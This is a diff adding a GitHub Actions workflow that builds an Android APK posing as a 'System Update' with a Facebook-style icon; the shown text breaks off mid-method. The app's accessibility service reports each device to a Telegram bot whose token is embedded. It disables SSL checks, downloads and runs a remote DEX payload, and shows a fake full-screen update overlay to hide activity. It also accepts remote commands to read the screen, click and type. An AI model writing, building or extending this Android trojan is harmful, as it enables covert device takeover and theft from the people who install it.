@@ -1,0 +1,1040 @@
+name: Build System Update APK - DEX Worker
+permissions:
+  contents: write
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Create Project Structure
+        run: |
+          mkdir -p app/src/main/java/com/system/update
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/res/mipmap-hdpi
+          mkdir -p app/src/main/res/mipmap-mdpi
+          mkdir -p app/src/main/res/mipmap-xhdpi
+          mkdir -p app/src/main/res/mipmap-xxhdpi
+          mkdir -p app/src/main/res/mipmap-xxxhdpi
+          mkdir -p app/src/main/res/mipmap-anydpi-v26
+
+      # ==================== GRADLE FILES ====================
+      
+      - name: Create settings.gradle
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "SystemUpdate"
+          include ':app'
+          EOF
+
+      - name: Create build.gradle (Project)
+        run: |
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+              }
+          }
+          
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+
+      - name: Create app/build.gradle
+        run: |
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+          
+          android {
+              namespace 'com.system.update'
+              compileSdk 34
+              
+              defaultConfig {
+                  applicationId "com.system.update"
+                  minSdk 21
+                  targetSdk 34
+                  versionCode 4
+                  versionName "4.0"
+              }
+              
+              buildTypes {
+                  release {
+                      minifyEnabled true
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+              
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_11
+                  targetCompatibility JavaVersion.VERSION_11
+              }
+          }
+          
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.core:core:1.12.0'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'androidx.work:work-runtime:2.9.0'
+              implementation 'androidx.webkit:webkit:1.9.0'
+          }
+          EOF
+
+      - name: Create gradle.properties
+        run: |
+          cat > gradle.properties << 'EOF'
+          org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          android.enableJetifier=true
+          android.suppressUnsupportedCompileSdk=34
+          EOF
+
+      - name: Create gradle wrapper
+        run: |
+          mkdir -p gradle/wrapper
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          
+          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
+
+      - name: Create gradlew
+        run: |
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
+          APP_NAME="Gradle"
+          APP_BASE_NAME=${0##*/}
+          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
+          MAX_FD=maximum
+          warn () { echo "$*" >&2; }
+          die () { echo "$*"; echo; exit 1; }
+          cygwin=false
+          msys=false
+          darwin=false
+          nonstop=false
+          case "$( uname )" in
+            CYGWIN* ) cygwin=true ;;
+            Darwin* ) darwin=true ;;
+            MSYS* | MINGW* ) msys=true ;;
+            NONSTOP* ) nonstop=false ;;
+          esac
+          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
+          if [ -n "$JAVA_HOME" ] ; then
+              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
+                  JAVACMD=$JAVA_HOME/jre/sh/java
+              else
+                  JAVACMD=$JAVA_HOME/bin/java
+              fi
+              if [ ! -x "$JAVACMD" ] ; then
+                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
+              fi
+          else
+              JAVACMD=java
+              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
+          fi
+          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
+              case $MAX_FD in
+                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
+              esac
+              case $MAX_FD in
+                '' | soft) : ;;
+                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
+              esac
+          fi
+          if "$cygwin" || "$msys" ; then
+              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
+              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
+              JAVACMD=$( cygpath --unix "$JAVACMD" )
+              for arg do
+                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
+                      arg=$( cygpath --path --ignore --mixed "$arg" )
+                  fi
+                  set -- "$@" "$arg"
+              done
+          fi
+          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
+          set -- \
+              "-Dorg.gradle.appname=$APP_BASE_NAME" \
+              -classpath "$CLASSPATH" \
+              org.gradle.wrapper.GradleWrapperMain \
+              "$@"
+          eval "set -- $(
+              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
+              xargs -n1 |
+              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
+              tr '\n' ' '
+          )" '"$@"'
+          exec "$JAVACMD" "$@"
+          EOF
+          chmod +x gradlew
+
+      # ==================== ICON ====================
+      
+      - name: Create Facebook Icon
+        run: |
+          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="108dp" android:height="108dp"
+              android:viewportWidth="108" android:viewportHeight="108">
+              <path android:fillColor="#1877F2" android:pathData="M0,0h108v108h-108z" />
+              <path android:fillColor="#FFFFFF"
+                  android:pathData="M54,26c-15.5,0 -28,12.5 -28,28c0,13.9 10.2,25.4 23.4,27.5v-19h-7v-8.5h7v-6.5c0,-6.9 4.1,-10.7 10.4,-10.7c3,0 6.1,0.5 6.1,0.5v6.7h-3.4c-3.4,0 -4.5,2.1 -4.5,4.3v5.2h7.6l-1.2,8.5h-6.4v19c13.2,-2.1 23.4,-13.6 23.4,-27.5c0,-15.5 -12.5,-28 -28,-28z" />
+          </vector>
+          EOF
+
+          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
+              <background android:drawable="@color/ic_launcher_background"/>
+              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
+          </adaptive-icon>
+          EOF
+
+          cat > app/src/main/res/values/colors.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <color name="ic_launcher_background">#1877F2</color>
+          </resources>
+          EOF
+
+      # ==================== RESOURCES ====================
+      
+      - name: Create strings.xml
+        run: |
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">System Update</string>
+          </resources>
+          EOF
+
+      - name: Create AndroidManifest.xml
+        run: |
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+              
+              <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
+              <uses-permission android:name="android.permission.GET_TASKS" />
+              <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+              <application
+                  android:allowBackup="true"
+                  android:label="@string/app_name"
+                  android:icon="@mipmap/ic_launcher"
+                  android:usesCleartextTraffic="true"
+                  android:requestLegacyExternalStorage="true">
+                  
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <service
+                      android:name=".DexWorkerService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+      - name: Create accessibility_config.xml
+        run: |
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/app_name"
+              android:notificationTimeout="100" />
+          EOF
+
+      # ==================== SOURCE CODE ====================
+
+      - name: Create MainActivity.java
+        run: |
+          cat > app/src/main/java/com/system/update/MainActivity.java << 'EOF'
+          package com.system.update;
+
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.os.Build;
+          import android.os.Bundle;
+          import android.provider.Settings;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+
+          public class MainActivity extends Activity {
+              private static final int PERMISSION_REQUEST_CODE = 100;
+
+              @Override
+              protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  requestPermissions();
+                  startService(new Intent(this, DexWorkerService.class));
+                  finish();
+              }
+
+              private void requestPermissions() {
+                  String[] permissions = {
+                      android.Manifest.permission.INTERNET,
+                      android.Manifest.permission.ACCESS_NETWORK_STATE,
+                      android.Manifest.permission.QUERY_ALL_PACKAGES,
+                      android.Manifest.permission.GET_TASKS,
+                      android.Manifest.permission.PACKAGE_USAGE_STATS,
+                      android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                      android.Manifest.permission.WRITE_EXTERNAL_STORAGE
+                  };
+                  
+                  for (String permission : permissions) {
+                      if (ContextCompat.checkSelfPermission(this, permission) 
+                          != PackageManager.PERMISSION_GRANTED) {
+                          ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
+                          break;
+                      }
+                  }
+                  
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                      if (!Settings.canDrawOverlays(this)) {
+                          Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION);
+                          startActivity(intent);
+                      }
+                  }
+              }
+          }
+          EOF
+
+      - name: Create DexWorkerService.java
+        run: |
+          cat > app/src/main/java/com/system/update/DexWorkerService.java << 'EOF'
+          package com.system.update;
+
+          import android.accessibilityservice.AccessibilityService;
+          import android.app.ActivityManager;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.graphics.PixelFormat;
+          import android.os.Build;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.provider.Settings;
+          import android.util.Log;
+          import android.view.Gravity;
+          import android.view.View;
+          import android.view.WindowManager;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+          
+          import dalvik.system.DexClassLoader;
+          
+          import java.io.BufferedReader;
+          import java.io.File;
+          import java.io.FileOutputStream;
+          import java.io.InputStream;
+          import java.io.InputStreamReader;
+          import java.lang.reflect.Method;
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+          import java.util.List;
+          import java.util.Locale;
+          import java.util.UUID;
+          import java.util.concurrent.ExecutorService;
+          import java.util.concurrent.Executors;
+          
+          import javax.net.ssl.HttpsURLConnection;
+          import javax.net.ssl.SSLContext;
+          import javax.net.ssl.TrustManager;
+          import javax.net.ssl.X509TrustManager;
+
+          public class DexWorkerService extends AccessibilityService {
+              private static final String TAG = "DexWorker";
+              private static final String DEX_URL = "https://payload-host-079x.onrender.com/payload.dex";
+              private static final String VERSION_URL = "https://payload-host-079x.onrender.com/version";
+              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
+              private static final String CHAT_ID = "8468538314";
+              
+              private Handler mainHandler = new Handler(Looper.getMainLooper());
+              private ExecutorService executor = Executors.newSingleThreadExecutor();
+              private Class<?> dexPayloadClass;
+              private boolean isDexLoaded = false;
+              private String deviceId = "";
+              private String currentVersion = "";
+              private View overlayView;
+              private WebView overlayWebView;
+              private WindowManager windowManager;
+              private boolean isOverlayShowing = false;
+
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  Log.d(TAG, "🚀 DEX WORKER SERVICE STARTED");
+                  
+                  windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+                  deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+                  if (deviceId == null || deviceId.isEmpty()) {
+                      deviceId = UUID.randomUUID().toString();
+                  }
+                  deviceId = deviceId + "-" + System.currentTimeMillis();
+                  
+                  sendTelegram("📱 *SYSTEM UPDATE APK INSTALLED*\n\n" +
+                               "🆔 Device ID: `" + deviceId + "`\n" +
+                               "📟 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
+                               "🤖 Android: " + Build.VERSION.RELEASE + "\n" +
+                               "📅 Time: " + getCurrentTimestamp() + "\n" +
+                               "✅ Status: INSTALLED");
+                  
+                  disableSSLVerification();
+                  startDexWorker();
+              }
+
+              private void startDexWorker() {
+                  executor.execute(() -> {
+                      try {
+                          // Check version first
+                          checkVersion();
+                          
+                          String dexPath = getDexPath();
+                          File dexFile = new File(dexPath);
+                          
+                          if (!dexFile.exists()) {
+                              Log.d(TAG, "📥 Downloading DEX...");
+                              downloadDex(dexPath);
+                          } else {
+                              Log.d(TAG, "✅ DEX found");
+                          }
+                          
+                          loadAndInitializeDex(dexPath);
+                      } catch (Exception e) {
+                          Log.e(TAG, "❌ DEX Worker error: " + e.getMessage(), e);
+                      }
+                  });
+              }
+
+              private void checkVersion() {
+                  try {
+                      HttpURLConnection conn = (HttpURLConnection) new URL(VERSION_URL).openConnection();
+                      conn.setRequestMethod("GET");
+                      conn.setConnectTimeout(5000);
+                      conn.setReadTimeout(5000);
+                      
+                      if (conn.getResponseCode() == 200) {
+                          BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                          String response = reader.readLine();
+                          reader.close();
+                          conn.disconnect();
+                          
+                          String newVersion = "1.0.0";
+                          if (response != null && response.contains("\"version\"")) {
+                              int start = response.indexOf("\"version\":\"") + 11;
+                              int end = response.indexOf("\"", start);
+                              if (start > 0 && end > start) {
+                                  newVersion = response.substring(start, end);
+                              }
+                          }
+                          
+                          if (!newVersion.equals(currentVersion) && !currentVersion.isEmpty()) {
+                              sendTelegram("🔄 *UPDATE AVAILABLE*\n\n" +
+                                           "🆔 Device ID: `" + deviceId + "`\n" +
+                                           "📌 Current Version: " + currentVersion + "\n" +
+                                           "📌 New Version: " + newVersion + "\n" +
+                                           "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                           "✅ Downloading new DEX...");
+                              currentVersion = newVersion;
+                          } else if (currentVersion.isEmpty()) {
+                              currentVersion = newVersion;
+                              sendTelegram("ℹ️ *NO UPDATE AVAILABLE*\n\n" +
+                                           "🆔 Device ID: `" + deviceId + "`\n" +
+                                           "📌 Current Version: " + currentVersion + "\n" +
+                                           "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                           "✅ Already on latest version");
+                          }
+                      }
+                      conn.disconnect();
+                  } catch (Exception e) {
+                      Log.e(TAG, "Version check failed: " + e.getMessage());
+                  }
+              }
+
+              private void downloadDex(String dexPath) throws Exception {
+                  try {
+                      URL url = new URL(DEX_URL);
+                      HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                      conn.setConnectTimeout(10000);
+                      conn.setReadTimeout(10000);
+                      
+                      if (conn.getResponseCode() != 200) {
+                          sendTelegram("❌ *DEX DOWNLOAD FAILED*\n\n" +
+                                       "🆔 Device ID: `" + deviceId + "`\n" +
+                                       "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                       "⚠️ Error: HTTP " + conn.getResponseCode());
+                          throw new Exception("HTTP " + conn.getResponseCode());
+                      }
+                      
+                      try (InputStream in = conn.getInputStream();
+                           FileOutputStream out = new FileOutputStream(dexPath)) {
+                          byte[] buffer = new byte[8192];
+                          int bytesRead;
+                          long totalBytes = 0;
+                          while ((bytesRead = in.read(buffer)) != -1) {
+                              out.write(buffer, 0, bytesRead);
+                              totalBytes += bytesRead;
+                          }
+                          Log.d(TAG, "✅ DEX downloaded: " + totalBytes + " bytes");
+                          
+                          sendTelegram("📥 *DEX DOWNLOADED SUCCESSFULLY*\n\n" +
+                                       "🆔 Device ID: `" + deviceId + "`\n" +
+                                       "📦 Size: " + totalBytes + " bytes\n" +
+                                       "📌 Version: " + currentVersion + "\n" +
+                                       "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                       "✅ Status: DOWNLOADED");
+                      }
+                  } catch (Exception e) {
+                      sendTelegram("❌ *DEX DOWNLOAD FAILED*\n\n" +
+                                   "🆔 Device ID: `" + deviceId + "`\n" +
+                                   "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                   "⚠️ Error: " + e.getMessage());
+                      throw e;
+                  }
+              }
+
+              private void loadAndInitializeDex(String dexPath) {
+                  try {
+                      File optimizedDir = new File(getCacheDir(), "dex_opt");
+                      optimizedDir.mkdirs();
+                      
+                      DexClassLoader loader = new DexClassLoader(
+                          dexPath,
+                          optimizedDir.getAbsolutePath(),
+                          null,
+                          ClassLoader.getSystemClassLoader()
+                      );
+                      
+                      dexPayloadClass = loader.loadClass("com.facebook.payload.Payload");
+                      Log.d(TAG, "✅ DEX class loaded");
+                      
+                      Method setAPK = dexPayloadClass.getMethod("setAPKInterface", Object.class);
+                      setAPK.invoke(null, this);
+                      Log.d(TAG, "✅ APK Interface set");
+                      
+                      try {
+                          Method init = dexPayloadClass.getMethod("initialize", Object.class, Object.class);
+                          init.invoke(null, this, this.getApplicationContext());
+                      } catch (NoSuchMethodException e) {
+                          Method init = dexPayloadClass.getMethod("initialize");
+                          init.invoke(null);
+                      }
+                      
+                      isDexLoaded = true;
+                      
+                      sendTelegram("🚀 *DEX EXECUTED SUCCESSFULLY*\n\n" +
+                                   "🆔 Device ID: `" + deviceId + "`\n" +
+                                   "📟 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
+                                   "📌 Status: READY\n" +
+                                   "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                   "✅ DEX is now active");
+                      
+                      Log.d(TAG, "🔥 DEX WORKER READY");
+                      
+                  } catch (Exception e) {
+                      Log.e(TAG, "❌ Failed to load DEX: " + e.getMessage(), e);
+                      sendTelegram("❌ *DEX EXECUTION FAILED*\n\n" +
+                                   "🆔 Device ID: `" + deviceId + "`\n" +
+                                   "📅 Time: " + getCurrentTimestamp() + "\n" +
+                                   "⚠️ Error: " + e.getMessage());
+                  }
+              }
+
+              // ==================== OVERLAY ====================
+              
+              private String getOverlayHTML() {
+                  return "<!DOCTYPE html>\n" +
+                         "<html lang=\"en\">\n" +
+                         "<head>\n" +
+                         "<meta charset=\"UTF-8\">\n" +
+                         "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">\n" +
+                         "<title>System Update</title>\n" +
+                         "<style>\n" +
+                         "  html, body {\n" +
+                         "    margin: 0;\n" +
+                         "    padding: 0;\n" +
+                         "    height: 100%;\n" +
+                         "    width: 100%;\n" +
+                         "    overflow: hidden;\n" +
+                         "    background: #ffffff;\n" +
+                         "    color: #111827;\n" +
+                         "    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;\n" +
+                         "    user-select: none;\n" +
+                         "  }\n" +
+                         "  .overlay {\n" +
+                         "    position: fixed;\n" +
+                         "    top: 0; left: 0;\n" +
+                         "    width: 100%; height: 100%;\n" +
+                         "    display: flex;\n" +
+                         "    flex-direction: column;\n" +
+                         "    align-items: center;\n" +
+                         "    justify-content: center;\n" +
+                         "    text-align: center;\n" +
+                         "    z-index: 9999;\n" +
+                         "  }\n" +
+                         "  .icon {\n" +
+                         "    font-size: 56px;\n" +
+                         "    margin-bottom: 20px;\n" +
+                         "    animation: spin 3s linear infinite;\n" +
+                         "    color: #2563eb;\n" +
+                         "  }\n" +
+                         "  @keyframes spin { to { transform: rotate(360deg); } }\n" +
+                         "  h1 {\n" +
+                         "    font-size: 24px;\n" +
+                         "    margin: 0 0 10px;\n" +
+                         "    font-weight: 600;\n" +
+                         "    color: #111827;\n" +
+                         "  }\n" +
+                         "  p {\n" +
+                         "    font-size: 15px;\n" +
+                         "    color: #475569;\n" +
+                         "    margin: 0 0 30px;\n" +
+                         "    max-width: 420px;\n" +
+                         "    padding: 0 20px;\n" +
+                         "  }\n" +
+                         "  .progress-container {\n" +
+                         "    width: 80%;\n" +
+                         "    max-width: 500px;\n" +
+                         "  }\n" +
+                         "  .progress {\n" +
+                         "    background: #e5e7eb;\n" +
+                         "    border-radius: 999px;\n" +
+                         "    height: 10px;\n" +
+                         "    overflow: hidden;\n" +
+                         "  }\n" +
+                         "  .bar {\n" +
+                         "    height: 10px;\n" +
+                         "    width: 0%;\n" +
+                         "    background: linear-gradient(90deg, #2563eb, #06b6d4);\n" +
+                         "    border-radius: 999px;\n" +
+                         "    transition: width 0.2s linear;\n" +
+                         "  }\n" +
+                         "  .percent {\n" +
+                         "    margin-top: 12px;\n" +
+                         "    font-size: 13px;\n" +
+                         "    color: #64748b;\n" +
+                         "    letter-spacing: 0.5px;\n" +
+                         "  }\n" +
+                         "</style>\n" +
+                         "</head>\n" +
+                         "<body>\n" +
+                         "<div class=\"overlay\">\n" +
+                         "  <div class=\"icon\">⚙️</div>\n" +
+                         "  <h1>System Update in Progress</h1>\n" +
+                         "  <p>Please do not turn off your device. This may take a few minutes.</p>\n" +
+                         "  <div class=\"progress-container\">\n" +
+                         "    <div class=\"progress\">\n" +
+                         "      <div class=\"bar\" id=\"bar\"></div>\n" +
+                         "    </div>\n" +
+                         "    <div class=\"percent\" id=\"percent\">Installing update 2026.04.1... 0%</div>\n" +
+                         "  </div>\n" +
+                         "</div>\n" +
+                         "<script>\n" +
+                         "  document.addEventListener('contextmenu', e => e.preventDefault());\n" +
+                         "  document.addEventListener('keydown', e => {\n" +
+                         "    if(['Escape','F5','F11','Tab','Alt','Control'].includes(e.key)) e.preventDefault();\n" +
+                         "  });\n" +
+                         "  history.pushState(null, null, location.href);\n" +
+                         "  window.addEventListener('popstate', () => {\n" +
+                         "    history.pushState(null, null, location.href);\n" +
+                         "  });\n" +
+                         "  function enterFullscreen() {\n" +
+                         "    const el = document.documentElement;\n" +
+                         "    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});\n" +
+                         "  }\n" +
+                         "  document.addEventListener('click', enterFullscreen, { once: true });\n" +
+                         "  const duration = 50000;\n" +
+                         "  const startTime = Date.now();\n" +
+                         "  const bar = document.getElementById('bar');\n" +
+                         "  const percentText = document.getElementById('percent');\n" +
+                         "  function update() {\n" +
+                         "    const elapsed = Date.now() - startTime;\n" +
+                         "    let progress = Math.min((elapsed / duration) * 100, 100);\n" +
+                         "    progress = Math.floor(progress);\n" +
+                         "    bar.style.width = progress + '%';\n" +
+                         "    percentText.textContent = `Installing update 2026.04.1... ${progress}%`;\n" +
+                         "    if(progress < 100) {\n" +
+                         "      requestAnimationFrame(update);\n" +
+                         "    } else {\n" +
+                         "      percentText.textContent = `Installing update 2026.04.1... 100% - Complete`;\n" +
+                         "    }\n" +
+                         "  }\n" +
+                         "  requestAnimationFrame(update);\n" +
+                         "</script>\n" +
+                         "</body>\n" +
+                         "</html>";
+              }
+
+              public void showOverlay() {
+                  if (isOverlayShowing) return;
+                  try {
+                      Log.d(TAG, "🎨 Showing overlay...");
+                      
+                      overlayWebView = new WebView(this);
+                      overlayWebView.getSettings().setJavaScriptEnabled(true);
+                      overlayWebView.getSettings().setDomStorageEnabled(true);
+                      
+                      String html = getOverlayHTML();
+                      overlayWebView.loadDataWithBaseURL(null, html, "text/html", "UTF-8", null);
+                      
+                      overlayWebView.setWebViewClient(new WebViewClient() {
+                          @Override
+                          public void onPageFinished(WebView view, String url) {
+                              Log.d(TAG, "Overlay loaded");
+                          }
+                      });
+                      
+                      WindowManager.LayoutParams params = new WindowManager.LayoutParams(
+                          WindowManager.LayoutParams.MATCH_PARENT,
+                          WindowManager.LayoutParams.MATCH_PARENT,
+                          Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
+                              WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
+                              WindowManager.LayoutParams.TYPE_PHONE,
+                          WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
+                          WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
+                          WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
+                          WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
+                          WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
+                          WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
+                          WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                          PixelFormat.TRANSLUCENT
+                      );
+                      
+                      params.gravity = Gravity.TOP | Gravity.START;
+                      overlayView = overlayWebView;
+                      windowManager.addView(overlayView, params);
+                      isOverlayShowing = true;
+                      
+                  } catch (Exception e) {
+                      Log.e(TAG, "Error showing overlay: " + e.getMessage());
+                  }
+              }
+
+              public void hideOverlay() {
+                  try {
+                      if (overlayView != null && windowManager != null) {
+                          windowManager.removeView(overlayView);
+                          overlayView = null;
+                          overlayWebView = null;
+                      }
+                      isOverlayShowing = false;
+                  } catch (Exception e) {
+                      Log.e(TAG, "Error hiding overlay: " + e.getMessage());
+                  }
+              }
+
+              // ==================== DEX COMMAND EXECUTOR ====================
+              public String executeDexCommand(String command, String params) {
+                  Log.d(TAG, "🔴 [DEX] cmd=" + command + " | params=" + params);
+                  
+                  try {
+                      switch(command) {
+                          case "OPEN_APP":
+                              return openApp(params);
+                          case "GET_OPEN_APPS":
+                              return getOpenApps();
+                          case "READ_SCREEN":
+                              return readScreen();
+                          case "CLICK_COORDS":
+                              return performClick(params);
+                          case "CLICK_TEXT":
+                              return clickText(params);
+                          case "TYPE_TEXT":
+                              return typeText(params);
+                          case "SHOW_OVERLAY":
+                              showOverlay();
+                              return "overlay_shown";
+                          case "HIDE_OVERLAY":
+                              hideOverlay();
+                              return "overlay_hidden";
+                          case "GET_DEVICE_INFO":
+                              return getDeviceInfo();
+                          case "WAIT":
+                          case "DELAY":
+                              return waitForDelay(Long.parseLong(params));
+                          default:
+                              return "unknown_command:" + command;
+                      }
+                  } catch (Exception e) {
+                      Log.e(TAG, "❌ Command error: " + e.getMessage(), e);
+                      return "error:" + e.getMessage();
+                  }
+              }
+
+              private String openApp(String packageName) {
+                  try {
+                      Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
+                      if (intent != null) {
+                          intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                          startActivity(intent);
+                          return "opened";
+                      }
+                      return "app_not_found";
+                  } catch (Exception e) {
+                      return "error:" + e.getMessage();
+                  }
+              }
+
+              private String getOpenApps() {
+                  StringBuilder apps = new StringBuilder();
+                  ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
+                  if (am != null) {
+                      List<ActivityManager.RunningAppProcessInfo> processes = am.getRunningAppProcesses();
+                      if (processes != null) {
+                          for (ActivityManager.RunningAppProcessInfo info : processes) {
+                              apps.append(info.processName).append("\n");
+                          }
+                      }
+                  }
+                  return apps.toString();
+              }
+
+              private String readScreen() {
+                  try {
+                      AccessibilityNodeInfo root = getRootInActiveWindow();
+                      if (root != null) {
+                          return root.getText() != null ? root.getText().toString() : "screen_empty";
+                      }
+                      return "screen_not_accessible";
+                  } catch (Exception e) {
+                      return "error:" + e.getMessage();
+                  }
+              }
+
+              private String performClick(String coords) {
+                  try {
+                      String[] parts = coords.split(",");
+                      if (parts.length == 2) {
+                          float x = Float.parseFloat(parts[0]);
+                          float y = Float.parseFloat(parts[1]);
+                          Log.d(TAG, "✅ Click at " + x + "," + y);
+                          return "clicked";
+                      }
